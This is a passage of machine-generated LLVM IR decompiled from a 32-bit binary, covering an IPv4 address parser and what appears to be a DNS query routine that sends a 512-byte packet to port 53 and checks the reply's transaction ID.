  br i1 %v3_1000ad006, label %dec_label_pc_1000ad10, label %dec_label_pc_1000ad08

dec_label_pc_1000ace0:                            ; preds = %dec_label_pc_1000ace4
  %v3_1000ace4 = zext i8 %v2_1000ace4 to i32
  %v4_1000acf0 = icmp eq i32 %v3_1000ace4, %v1_1000acf0
  %v0_1000ace0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000acf0, i32 %v0_1000ace0)
  %v0_1000ace4.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000acf0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ace4

dec_label_pc_1000ace4:                            ; preds = %dec_label_pc_1000ad08, %dec_label_pc_1000ace0
  %v1_1000acf0 = phi i32 [ %v1_1000acf09, %dec_label_pc_1000ad08 ], [ %v1_1000acf0.pre, %dec_label_pc_1000ace0 ]
  %v0_1000ace4 = phi i32 [ %tmp, %dec_label_pc_1000ad08 ], [ %v0_1000ace4.pre, %dec_label_pc_1000ace0 ]
  %v1_1000ace4 = inttoptr i32 %v0_1000ace4 to i8*
  %v2_1000ace4 = load i8, i8* %v1_1000ace4, align 1
  %v1_1000ace8 = add i32 %v0_1000ace4, 1
  store i32 %v1_1000ace8, i32* %r9.global-to-local, align 4
  %v3_1000acec = icmp eq i8 %v2_1000ace4, 0
  br i1 %v3_1000acec, label %dec_label_pc_1000acf8, label %dec_label_pc_1000ace0

dec_label_pc_1000acf8:                            ; preds = %dec_label_pc_1000ace4
  %v0_1000acf8 = load i32, i32* @r3, align 4
  %v1_1000acf8 = add i32 %v0_1000acf8, 1
  store i32 %v1_1000acf8, i32* @r3, align 4
  %v1_1000acfc = inttoptr i32 %v1_1000acf8 to i8*
  %v2_1000acfc = load i8, i8* %v1_1000acfc, align 1
  %v3_1000acfc = zext i8 %v2_1000acfc to i32
  store i32 %v3_1000acfc, i32* %r11.global-to-local, align 4
  %v3_1000ad00 = icmp eq i8 %v2_1000acfc, 0
  br i1 %v3_1000ad00, label %dec_label_pc_1000ad10, label %dec_label_pc_1000ad08

dec_label_pc_1000ad08:                            ; preds = %dec_label_pc_1000acdc, %dec_label_pc_1000acf8
  %v1_1000acf09 = phi i32 [ %v3_1000acfc, %dec_label_pc_1000acf8 ], [ %v3_1000acfc4, %dec_label_pc_1000acdc ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ace4

dec_label_pc_1000ad10:                            ; preds = %dec_label_pc_1000acf8, %dec_label_pc_1000acdc
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000ace4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ad08, { 1, 0 }
}

define i32 @function_1000ad18(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000ad18:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000ad18 = icmp eq i8* %arg1, null
  br i1 %v3_1000ad18, label %dec_label_pc_1000add0, label %dec_label_pc_1000ad20

dec_label_pc_1000ad20:                            ; preds = %dec_label_pc_1000ad18
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000ad34.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000ad30

dec_label_pc_1000ad30:                            ; preds = %dec_label_pc_1000ad20, %dec_label_pc_1000ada8
  %v0_1000ada8 = phi i32 [ 0, %dec_label_pc_1000ad20 ], [ %v2_1000adb0, %dec_label_pc_1000ada8 ]
  %v0_1000adac = phi i32 [ 1, %dec_label_pc_1000ad20 ], [ %v1_1000adac, %dec_label_pc_1000ada8 ]
  %v0_1000ad30 = phi i32 [ %tmp, %dec_label_pc_1000ad20 ], [ %v0_1000ad303, %dec_label_pc_1000ada8 ]
  %v1_1000ad30 = inttoptr i32 %v0_1000ad30 to i8*
  %v2_1000ad30 = load i8, i8* %v1_1000ad30, align 1
  %v3_1000ad30 = zext i8 %v2_1000ad30 to i32
  %v1_1000ad38 = mul nuw nsw i32 %v3_1000ad30, 2
  %v2_1000ad3c = add i32 %v1_1000ad38, %v3_1000ad34.pre
  %v3_1000ad3c = inttoptr i32 %v2_1000ad3c to i16*
  %v4_1000ad3c = load i16, i16* %v3_1000ad3c, align 2
  %v1_1000ad40 = and i16 %v4_1000ad3c, 8
  %v3_1000ad40 = icmp eq i16 %v1_1000ad40, 0
  br i1 %v3_1000ad40, label %dec_label_pc_1000add0, label %dec_label_pc_1000ad48

dec_label_pc_1000ad48:                            ; preds = %dec_label_pc_1000ad30
  br label %dec_label_pc_1000ad60

dec_label_pc_1000ad50:                            ; preds = %dec_label_pc_1000ad60
  %v1_1000ad64 = mul i32 %v1_1000adb0, 10
  %v2_1000ad6c = add i32 %v3_1000ad60, %v1_1000ad64
  %v1_1000ad50 = add i32 %v2_1000ad6c, -48
  %v1_1000ad54 = add i32 %v0_1000ad98, 1
  %v2_1000ad58 = icmp sgt i32 %v1_1000ad50, 255
  br i1 %v2_1000ad58, label %dec_label_pc_1000add0, label %dec_label_pc_1000ad60

dec_label_pc_1000ad60:                            ; preds = %dec_label_pc_1000ad50, %dec_label_pc_1000ad48
  %v1_1000adb0 = phi i32 [ %v1_1000ad50, %dec_label_pc_1000ad50 ], [ 0, %dec_label_pc_1000ad48 ]
  %v0_1000ad98 = phi i32 [ %v1_1000ad54, %dec_label_pc_1000ad50 ], [ %v0_1000ad30, %dec_label_pc_1000ad48 ]
  %v1_1000ad60 = inttoptr i32 %v0_1000ad98 to i8*
  %v2_1000ad60 = load i8, i8* %v1_1000ad60, align 1
  %v3_1000ad60 = zext i8 %v2_1000ad60 to i32
  %v1_1000ad68 = mul nuw nsw i32 %v3_1000ad60, 2
  %v2_1000ad70 = add i32 %v1_1000ad68, %v3_1000ad34.pre
  %v3_1000ad70 = inttoptr i32 %v2_1000ad70 to i16*
  %v4_1000ad70 = load i16, i16* %v3_1000ad70, align 2
  %v5_1000ad70 = zext i16 %v4_1000ad70 to i32
  %v1_1000ad74 = and i32 %v5_1000ad70, 8
  %v3_1000ad74 = icmp eq i32 %v1_1000ad74, 0
  br i1 %v3_1000ad74, label %dec_label_pc_1000ad7c, label %dec_label_pc_1000ad50

dec_label_pc_1000ad7c:                            ; preds = %dec_label_pc_1000ad60
  %v2_1000ad7c = icmp sgt i32 %v0_1000adac, 3
  br i1 %v2_1000ad7c, label %dec_label_pc_1000ad94, label %dec_label_pc_1000ad84

dec_label_pc_1000ad84:                            ; preds = %dec_label_pc_1000ad7c
  %v3_1000ad84 = icmp eq i8 %v2_1000ad60, 46
  br i1 %v3_1000ad84, label %dec_label_pc_1000ad8c, label %dec_label_pc_1000add0

dec_label_pc_1000ad8c:                            ; preds = %dec_label_pc_1000ad84
  %v1_1000ad8c = add i32 %v0_1000ad98, 1
  br label %dec_label_pc_1000ada8

dec_label_pc_1000ad94:                            ; preds = %dec_label_pc_1000ad7c
  %v3_1000ad94 = icmp eq i8 %v2_1000ad60, 0
  %v1_1000ad98 = add i32 %v0_1000ad98, 1
  br i1 %v3_1000ad94, label %dec_label_pc_1000ada8, label %dec_label_pc_1000ada0

dec_label_pc_1000ada0:                            ; preds = %dec_label_pc_1000ad94
  %v1_1000ada0 = and i32 %v5_1000ad70, 32
  %v3_1000ada0 = icmp eq i32 %v1_1000ada0, 0
  br i1 %v3_1000ada0, label %dec_label_pc_1000add0, label %dec_label_pc_1000ada8

dec_label_pc_1000ada8:                            ; preds = %dec_label_pc_1000ada0, %dec_label_pc_1000ad94, %dec_label_pc_1000ad8c
  %v0_1000ad303 = phi i32 [ %v1_1000ad98, %dec_label_pc_1000ada0 ], [ %v1_1000ad98, %dec_label_pc_1000ad94 ], [ %v1_1000ad8c, %dec_label_pc_1000ad8c ]
  %v1_1000ada8 = mul i32 %v0_1000ada8, 256
  %v1_1000adac = add nuw nsw i32 %v0_1000adac, 1
  %v2_1000adb0 = or i32 %v1_1000adb0, %v1_1000ada8
  store i32 %v2_1000adb0, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000adac, 5
  br i1 %tmp10, label %dec_label_pc_1000ad30, label %dec_label_pc_1000adbc

dec_label_pc_1000adbc:                            ; preds = %dec_label_pc_1000ada8
  %v0_1000adbc = load i32, i32* @r4, align 4
  %v3_1000adbc = icmp eq i32 %v0_1000adbc, 0
  %v0_1000adc4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000adbc, i32 %v0_1000adc4)
  %v0_1000adc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000adc8 = load i32, i32* @r4, align 4
  %v2_1000adc8 = inttoptr i32 %v1_1000adc8 to i32*
  store i32 %v0_1000adc8, i32* %v2_1000adc8, align 4
  ret i32 1

dec_label_pc_1000add0:                            ; preds = %dec_label_pc_1000ad84, %dec_label_pc_1000ada0, %dec_label_pc_1000ad30, %dec_label_pc_1000ad50, %dec_label_pc_1000ad18
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000adb0, { 1, 0 }
  uselistorder i32 %v1_1000adac, { 1, 0 }
  uselistorder i32 %v0_1000ad98, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000add0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000ad30, { 1, 0 }
}

define i32 @function_1000add8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1000add8:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_1000addc = load i32, i32* @lr, align 4
  store i32 %v0_1000addc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268480008, i32* @lr, align 4
  %v0_1000ae04 = call i32 @function_1000809c()
  store i32 %v0_1000ae04, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268480020, i32* @lr, align 4
  %v0_1000ae10 = call i32 @function_1000809c()
  %v0_1000ae14 = load i32, i32* @r30, align 4
  %v3_1000ae14 = icmp eq i32 %v0_1000ae14, 0
  store i32 %v0_1000ae10, i32* @r21, align 4
  br i1 %v3_1000ae14, label %dec_label_pc_1000b3d0, label %dec_label_pc_1000ae20

dec_label_pc_1000ae20:                            ; preds = %dec_label_pc_1000add8
  %v3_1000ae20 = icmp eq i32 %v0_1000ae10, 0
  br i1 %v3_1000ae20, label %dec_label_pc_1000b3d0, label %dec_label_pc_1000ae28

dec_label_pc_1000ae28:                            ; preds = %dec_label_pc_1000ae20
  %v0_1000ae28 = load i32, i32* @r23, align 4
  %v3_1000ae28 = icmp eq i32 %v0_1000ae28, 0
  br i1 %v3_1000ae28, label %dec_label_pc_1000b3d0, label %dec_label_pc_1000ae30

dec_label_pc_1000ae30:                            ; preds = %dec_label_pc_1000ae28
  %v0_1000ae30 = load i32, i32* %r14.global-to-local, align 4
  %v1_1000ae30 = inttoptr i32 %v0_1000ae30 to i8*
  %v2_1000ae30 = load i8, i8* %v1_1000ae30, align 1
  %v3_1000ae30 = zext i8 %v2_1000ae30 to i32
  store i32 %v3_1000ae30, i32* %r0.global-to-local, align 4
  %v3_1000ae34 = icmp eq i8 %v2_1000ae30, 0
  br i1 %v3_1000ae34, label %dec_label_pc_1000b3d0, label %dec_label_pc_1000ae3c

dec_label_pc_1000ae3c:                            ; preds = %dec_label_pc_1000ae30
  store i32 %v0_1000ae30, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  %v0_1000ae44 = call i32 @function_10007284()
  %v0_1000ae4c = load i32, i32* %r14.global-to-local, align 4
  %v2_1000ae4c = add i32 %v0_1000ae4c, %v0_1000ae44
  %v1_1000ae54 = add i32 %v2_1000ae4c, -1
  %v2_1000ae54 = inttoptr i32 %v1_1000ae54 to i8*
  %v3_1000ae54 = load i8, i8* %v2_1000ae54, align 1
  %v4_1000ae54 = zext i8 %v3_1000ae54 to i32
  store i32 %v4_1000ae54, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012b0c.308 to i32), i32* %r29.global-to-local, align 4
  %v2_1000ae5c = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_1000ae5c, i32* %r28.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* @r3, align 4
  store i32 -1, i32* @r19, align 4
  %v1_1000ae6c = xor i32 %v4_1000ae54, 46
  store i32 %v1_1000ae6c, i32* %r17.global-to-local, align 4
  %v0_1000ae70 = call i32 @function_100091fc()
  %v1_1000ae78 = call i32 @llvm.ctlz.i32(i32 %v1_1000ae6c, i1 true)
  store i32 %v1_1000ae78, i32* %r17.global-to-local, align 4
  %v0_1000ae7c = call i32 @function_100091f4()
  %v3_1000ae84 = load i32, i32* @global_var_100104c4.309, align 4
  store i32 %v3_1000ae84, i32* %r11.global-to-local, align 4
  %v3_1000ae8c = load i16, i16* @global_var_100103dc.310, align 2
  %v4_1000ae8c = zext i16 %v3_1000ae8c to i32
  store i32 %v4_1000ae8c, i32* @r25, align 4
  store i32 %v2_1000ae5c, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  %v1_1000ae9c = load i32, i32* @r23, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_1000ae9c = srem i32 %v3_1000ae84, %v1_1000ae9c
  %v2_1000aea8 = sub i32 %v3_1000ae84, %v2_1000ae9c
  store i32 %v2_1000aea8, i32* %r0.global-to-local, align 4
  store i32 %v2_1000ae9c, i32* @r26, align 4
  %v0_1000aeb0 = call i32 @function_100091fc()
  %v0_1000b3c4.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_1000b3c4.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1000aeb8.lr.ph.lr.ph, label %dec_label_pc_1000b3dc

dec_label_pc_1000aeb8.lr.ph.lr.ph:                ; preds = %dec_label_pc_1000ae3c
  %v2_1000aed0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_1000afe4 = ptrtoint i32* %stack_var_-204 to i32
  %v2_1000b044 = ptrtoint i16* %stack_var_-212 to i32
  %v2_1000b088 = ptrtoint i32* %stack_var_-248 to i32
  %v3_1000b0e4 = icmp eq i32 %tmp37, 0
  %v3_1000b0f0 = icmp eq i32 %tmp36, 3
  %v2_1000b16c = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1000b1c0 = ptrtoint i32* %stack_var_-184 to i32
  %v3_1000b1ec = icmp eq i32 %tmp33, 0
  %v3_1000b160 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1000aeb8.lr.ph

dec_label_pc_1000aeb8:                            ; preds = %dec_label_pc_1000aeb8.lr.ph, %dec_label_pc_1000b068
  %v0_1000aeb8 = load i32, i32* @r19, align 4
  %v3_1000aeb8 = icmp eq i32 %v0_1000aeb8, -1
  br i1 %v3_1000aeb8, label %dec_label_pc_1000aec8, label %dec_label_pc_1000aec0

dec_label_pc_1000aec0:                            ; preds = %dec_label_pc_1000aeb8
  store i32 268480200, i32* @lr, align 4
  %v1_1000aec4 = call i32 @function_10004ab4(i32 %v0_1000aeb8)
  br label %dec_label_pc_1000aec8

dec_label_pc_1000aec8:                            ; preds = %dec_label_pc_1000aeb8, %dec_label_pc_1000aec0
  store i32 %v2_1000aed0, i32* %r29.global-to-local, align 4
  %v0_1000aed4 = load i32, i32* @r30, align 4
  store i32 268480220, i32* @lr, align 4
  %v3_1000aed8 = call i32 @function_100071a0(i32 %v0_1000aed4, i32 0, i32 512)
  store i32 268480236, i32* @lr, align 4
  %v3_1000aee8 = call i32 @function_100071a0(i32 %v2_1000aed0, i32 0, i32 48)
  %v0_1000aeec = load i32, i32* @r25, align 4
  %v1_1000aeec = add i32 %v0_1000aeec, 1
  %v1_1000aef0 = urem i32 %v1_1000aeec, 65536
  store i32 %v1_1000aef0, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000aefc = load i32, i32* @r30, align 4
  store i32 %v1_1000aef0, i32* %stack_var_-144, align 4
  %v4_1000af10 = call i32 @function_1000c81c(i32* nonnull %stack_var_-144, i32 %v0_1000aefc, i32 512)
  store i32 %v4_1000af10, i32* %r28.global-to-local, align 4
  %v1_1000af14 = icmp slt i32 %v4_1000af10, 0
  br i1 %v1_1000af14, label %dec_label_pc_1000b3dc, label %dec_label_pc_1000af1c

dec_label_pc_1000af1c:                            ; preds = %dec_label_pc_1000aec8
  %v0_1000af1c = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_1000af1c, i32* @r4, align 4
  %v0_1000af24 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268480304, i32* @lr, align 4
  %v4_1000af2c = call i32 @function_10007414(i32 %v0_1000af24, i32 %v0_1000af1c, i32 1025)
  store i32 ptrtoint (i32* @global_var_100103e0.262 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* @r3, align 4
  %v0_1000af44 = call i32 @function_100091fc()
  %v0_1000af4c = call i32 @function_100091f4()
  %v0_1000af54 = load i32, i32* @r22, align 4
  %v1_1000af54 = icmp slt i32 %v0_1000af54, 0
  %v0_1000af58 = load i32, i32* @r26, align 4
  %v1_1000af58 = mul i32 %v0_1000af58, 4
  store i32 %v1_1000af58, i32* %r0.global-to-local, align 4
  %v2_1000af5c = add i32 %v1_1000af58, %arg4
  %v3_1000af5c = inttoptr i32 %v2_1000af5c to i32*
  %v4_1000af5c = load i32, i32* %v3_1000af5c, align 4
  store i32 %v4_1000af5c, i32* %r29.global-to-local, align 4
  br i1 %v1_1000af54, label %dec_label_pc_1000afa4, label %dec_label_pc_1000af64

dec_label_pc_1000af64:                            ; preds = %dec_label_pc_1000af1c
  %v3_1000af68 = load i32, i32* @global_var_100104cc.312, align 4
  store i32 %v3_1000af68, i32* %r0.global-to-local, align 4
  %v2_1000af6c = icmp slt i32 %v0_1000af54, %v3_1000af68
  br i1 %v2_1000af6c, label %dec_label_pc_1000af74, label %dec_label_pc_1000afa4

dec_label_pc_1000af74:                            ; preds = %dec_label_pc_1000af64
  store i32 ptrtoint (i32* @global_var_1000f8a0.313 to i32), i32* @r4, align 4
  %v0_1000af80 = load i32, i32* @r21, align 4
  store i32 268480392, i32* @lr, align 4
  %v4_1000af84 = inttoptr i32 %v0_1000af80 to i8*
  %v5_1000af84 = call i32 @function_1000c010(i8* %v4_1000af84, i32 ptrtoint (i32* @global_var_1000f8a0.313 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000af8c = load i32, i32* @r22, align 4
  %v1_1000af8c = mul i32 %v0_1000af8c, 4
  store i32 %v1_1000af8c, i32* %r0.global-to-local, align 4
  %v2_1000af94 = add i32 %v1_1000af8c, ptrtoint (i32* @global_var_10012d3c.314 to i32)
  %v3_1000af94 = inttoptr i32 %v2_1000af94 to i32*
  %v4_1000af94 = load i32, i32* %v3_1000af94, align 4
  store i32 %v4_1000af94, i32* @r4, align 4
  %v0_1000af98 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000afa4.315 to i32), i32* @lr, align 4
  %v4_1000afa0 = inttoptr i32 %v0_1000af98 to i8*
  %v5_1000afa0 = call i32 @function_1000c010(i8* %v4_1000afa0, i32 %v4_1000af94, i32 1025, i32 ptrtoint (i32* @global_var_10012d3c.314 to i32))
  br label %dec_label_pc_1000afa4

dec_label_pc_1000afa4:                            ; preds = %dec_label_pc_1000af64, %dec_label_pc_1000af1c, %dec_label_pc_1000af74
  store i32 %v2_1000ae5c, i32* @r3, align 4
  %v0_1000afac = call i32 @function_100091fc()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000afb8 = load i32, i32* @r30, align 4
  %v1_1000afb8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000afb8 = add i32 %v1_1000afb8, %v0_1000afb8
  %v1_1000afbc = sub i32 512, %v1_1000afb8
  %v0_1000afc4 = load i32, i32* @r21, align 4
  store i32 %v0_1000afc4, i32* %stack_var_-240, align 4
  store i32 268480464, i32* @lr, align 4
  %v4_1000afcc = call i32 @function_1000c9cc(i32* nonnull %stack_var_-240, i32 %v2_1000afb8, i32 %v1_1000afbc)
  store i32 %v4_1000afcc, i32* @r27, align 4
  %v1_1000afd0 = icmp slt i32 %v4_1000afcc, 0
  br i1 %v1_1000afd0, label %dec_label_pc_1000b3dc, label %dec_label_pc_1000afd8

dec_label_pc_1000afd8:                            ; preds = %dec_label_pc_1000afa4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000afe0 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268480496, i32* @lr, align 4
  %v3_1000afec = inttoptr i32 %v0_1000afe0 to i8*
  %v4_1000afec = call i32 @function_1000c20c(i32 10, i8* %v3_1000afec, i32 %v2_1000afe4)
  %tmp59 = icmp slt i32 %v4_1000afec, 1
  br i1 %tmp59, label %dec_label_pc_1000b000thread-pre-split, label %dec_label_pc_1000aff8

dec_label_pc_1000aff8:                            ; preds = %dec_label_pc_1000afd8
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000b000

dec_label_pc_1000b000thread-pre-split:            ; preds = %dec_label_pc_1000afd8
  %v3_1000b000.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000b000

dec_label_pc_1000b000:                            ; preds = %dec_label_pc_1000b000thread-pre-split, %dec_label_pc_1000aff8
  %v3_1000b000 = phi i16 [ %v3_1000b000.pr, %dec_label_pc_1000b000thread-pre-split ], [ 10, %dec_label_pc_1000aff8 ]
  %v3_1000b004 = icmp eq i16 %v3_1000b000, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_1000b004, label %dec_label_pc_1000b02c, label %dec_label_pc_1000b018

dec_label_pc_1000b018:                            ; preds = %dec_label_pc_1000b000
  %v0_1000b01c = load i32, i32* @r29, align 4
  store i32 268480552, i32* @lr, align 4
  %v1_1000b024 = call i32 @function_10007b1c(i32 %v0_1000b01c)
  %v3_1000b02c.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000b02c

dec_label_pc_1000b02c:                            ; preds = %dec_label_pc_1000b000, %dec_label_pc_1000b018
  %v3_1000b02c = phi i16 [ 10, %dec_label_pc_1000b000 ], [ %v3_1000b02c.pre, %dec_label_pc_1000b018 ]
  %v4_1000b02c = sext i16 %v3_1000b02c to i32
  store i32 268480572, i32* @lr, align 4
  %v3_1000b038 = call i32 @function_10008068(i32 %v4_1000b02c, i32 2, i32 17)
  store i32 %v3_1000b038, i32* @r19, align 4
  %v1_1000b03c = icmp slt i32 %v3_1000b038, 0
  br i1 %v1_1000b03c, label %dec_label_pc_1000b068, label %dec_label_pc_1000b044

dec_label_pc_1000b044:                            ; preds = %dec_label_pc_1000b02c
  store i32 268480592, i32* @lr, align 4
  %v3_1000b04c = call i32 @function_10007f50(i32 %v2_1000b044, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_1000b04c, -1
  br i1 %tmp60, label %dec_label_pc_1000b070, label %dec_label_pc_1000b058

dec_label_pc_1000b058:                            ; preds = %dec_label_pc_1000b044
  %v0_1000b058 = call i32 @function_10004e38()
  %v1_1000b05c = inttoptr i32 %v0_1000b058 to i32*
  %v2_1000b05c = load i32, i32* %v1_1000b05c, align 4
  store i32 %v2_1000b05c, i32* %r0.global-to-local, align 4
  %v3_1000b060 = icmp eq i32 %v2_1000b05c, 101
  br i1 %v3_1000b060, label %dec_label_pc_1000b3a8, label %dec_label_pc_1000b068

dec_label_pc_1000b068:                            ; preds = %dec_label_pc_1000b058, %dec_label_pc_1000b02c
  %v0_1000b068 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000b068 = add i32 %v0_1000b068, 1
  store i32 %v1_1000b068, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_1000b068, 3
  br i1 %tmp61, label %dec_label_pc_1000aeb8, label %dec_label_pc_1000b3dc

dec_label_pc_1000b070:                            ; preds = %dec_label_pc_1000b044
  %v0_1000b070 = load i32, i32* @r28, align 4
  %v1_1000b070 = load i32, i32* @r27, align 4
  %v2_1000b070 = add i32 %v1_1000b070, %v0_1000b070
  %v0_1000b074 = load i32, i32* @r30, align 4
  %v0_1000b07c = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_1000b084.317 to i32), i32* @lr, align 4
  %v4_1000b080 = call i32 @function_1000b7a0(i32 %v0_1000b07c, i32 %v0_1000b074, i32 %v2_1000b070, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000b098 = load i32, i32* @r19, align 4
  store i32 %v0_1000b098, i32* %stack_var_-248, align 4
  store i32 268480672, i32* @lr, align 4
  %v3_1000b09c = call i32 @function_1000bb30(i32 %v2_1000b088, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_1000b09c, 1
  br i1 %tmp62, label %dec_label_pc_1000b3a8, label %dec_label_pc_1000b0a8

dec_label_pc_1000b0a8:                            ; preds = %dec_label_pc_1000b070
  %v0_1000b0a8 = load i32, i32* @r19, align 4
  %v0_1000b0ac = load i32, i32* @r30, align 4
  store i32 268480700, i32* @lr, align 4
  %v4_1000b0b8 = call i32 @function_10007fb4(i32 %v0_1000b0a8, i32 %v0_1000b0ac, i32 512, i32 0)
  store i32 %v4_1000b0b8, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1000b0b8, 12
  br i1 %tmp63, label %dec_label_pc_1000b350, label %dec_label_pc_1000b0c8

dec_label_pc_1000b0c8:                            ; preds = %dec_label_pc_1000b0a8
  %v0_1000b0c8 = load i32, i32* @r30, align 4
  %v2_1000b0d0 = inttoptr i32 %v0_1000b0c8 to i8*
  %v3_1000b0d0 = call i32 @function_1000c908(i8* %v2_1000b0d0, i32 %v2_1000aed0)
  %v3_1000b0d4 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_1000b0d4, i32* @r20, align 4
  %v1_1000b0d8 = load i32, i32* @r25, align 4
  %v4_1000b0d8 = icmp eq i32 %v3_1000b0d4, %v1_1000b0d8
  br i1 %v4_1000b0d8, label %dec_label_pc_1000b0e0, label %dec_label_pc_1000b350

dec_label_pc_1000b0e0:                            ; preds = %dec_label_pc_1000b0c8
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_1000b0e4, label %dec_label_pc_1000b350, label %dec_label_pc_1000b0ec

dec_label_pc_1000b0ec:                            ; preds = %dec_label_pc_1000b0e0
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1000b0f0, label %dec_label_pc_1000b0f8, label %dec_label_pc_1000b160

dec_label_pc_1000b0f8:                            ; preds = %dec_label_pc_1000b0ec
  %v0_1000b0f8 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000b0f8 = icmp eq i32 %v0_1000b0f8, 0
  br i1 %v3_1000b0f8, label %dec_label_pc_1000b100, label %dec_label_pc_1000b154

dec_label_pc_1000b100:                            ; preds = %dec_label_pc_1000b0f8
  store i32 ptrtoint (i32* @global_var_100103e0.262 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* %r28.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* @r3, align 4
  %v0_1000b11c = call i32 @function_100091fc()
  %v0_1000b124 = call i32 @function_100091f4()
  %v3_1000b12c = load i32, i32* @global_var_100104cc.312, align 4
  store i32 %v3_1000b12c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000ae5c, i32* @r3, align 4
  %v0_1000b138 = call i32 @function_100091fc()
  %v0_1000b13c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b13c = add i32 %v0_1000b13c, -1
  store i32 %v1_1000b13c, i32* %r29.global-to-local, align 4
  %v0_1000b140 = load i32, i32* @r22, align 4
  %v2_1000b140 = icmp slt i32 %v0_1000b140, %v1_1000b13c
  br i1 %v2_1000b140, label %dec_label_pc_1000b148, label %dec_label_pc_1000b154

dec_label_pc_1000b148:                            ; preds = %dec_label_pc_1000b100
  %v1_1000b148 = add i32 %v0_1000b140, 1
  store i32 %v1_1000b148, i32* @r22, align 4
  %v0_1000b14c = load i32, i32* @r20, align 4
  store i32 %v0_1000b14c, i32* @r25, align 4
  br label %dec_label_pc_1000b3c4thread-pre-split.backedge

